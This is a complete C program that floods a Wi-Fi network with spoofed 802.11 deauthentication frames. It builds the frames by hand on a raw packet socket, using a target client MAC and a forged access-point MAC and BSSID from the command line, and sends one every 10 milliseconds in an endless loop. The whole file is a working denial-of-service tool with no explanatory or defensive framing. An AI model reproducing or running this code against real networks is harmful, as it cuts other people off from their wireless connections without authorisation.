#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/socket.h>
#include <linux/if_packet.h>
#include <net/ethernet.h>
#include <net/if.h>
#include <sys/ioctl.h>
#include <arpa/inet.h>
#include <linux/if_ether.h>

typedef struct {
    unsigned char val[6];
} mac_addr;

void parse_mac(const char *str, unsigned char *mac) {
    sscanf(str, "%hhx:%hhx:%hhx:%hhx:%hhx:%hhx", &mac[0], &mac[1], &mac[2], &mac[3], &mac[4], &mac[5]);
}

int main(int argc, char *argv[]) {
    if (argc < 4) return 1;

    int s = socket(AF_PACKET, SOCK_RAW, htons(ETH_P_ALL));
    if (s < 0) exit(1);

    struct ifreq ifr;
    memset(&ifr, 0, sizeof(ifr));
    strncpy(ifr.ifr_name, argv[3], IFNAMSIZ-1);
    if (ioctl(s, SIOCGIFINDEX, &ifr) < 0) exit(1);

    struct sockaddr_ll sll;
    memset(&sll, 0, sizeof(sll));
    sll.sll_family = AF_PACKET;
    sll.sll_ifindex = ifr.ifr_ifindex;
    sll.sll_protocol = htons(ETH_P_ALL);

    unsigned char buf[128];
    memset(buf, 0, sizeof(buf));

    // Radiotap header
    buf[0] = 0x00; buf[1] = 0x00; 
    buf[2] = 0x08; buf[3] = 0x00; 
    buf[4] = 0x00; buf[5] = 0x00; buf[6] = 0x00; buf[7] = 0x00;

    int offset = 8;
    // Frame Control: Deauth (0xc0)
    buf[offset] = 0xc0; 
    buf[offset+1] = 0x00;
    buf[offset+2] = 0x3a; buf[offset+3] = 0x01;

    // Addrs
    parse_mac(argv[1], &buf[offset+4]); // Dest
    parse_mac(argv[2], &buf[offset+10]); // Source (AP)
    parse_mac(argv[2], &buf[offset+16]); // BSSID

    buf[offset+22] = 0x00; buf[offset+23] = 0x00; // Seq
    buf[offset+24] = 0x07; buf[offset+25] = 0x00; // Reason: Class 3 received from nonassociated STA

    int pkt_size = offset + 26;

    while (1) {
        sendto(s, buf, pkt_size, 0, (struct sockaddr*)&sll, sizeof(sll));
        usleep(10000); 
    }

    close(s);
    return 0;
}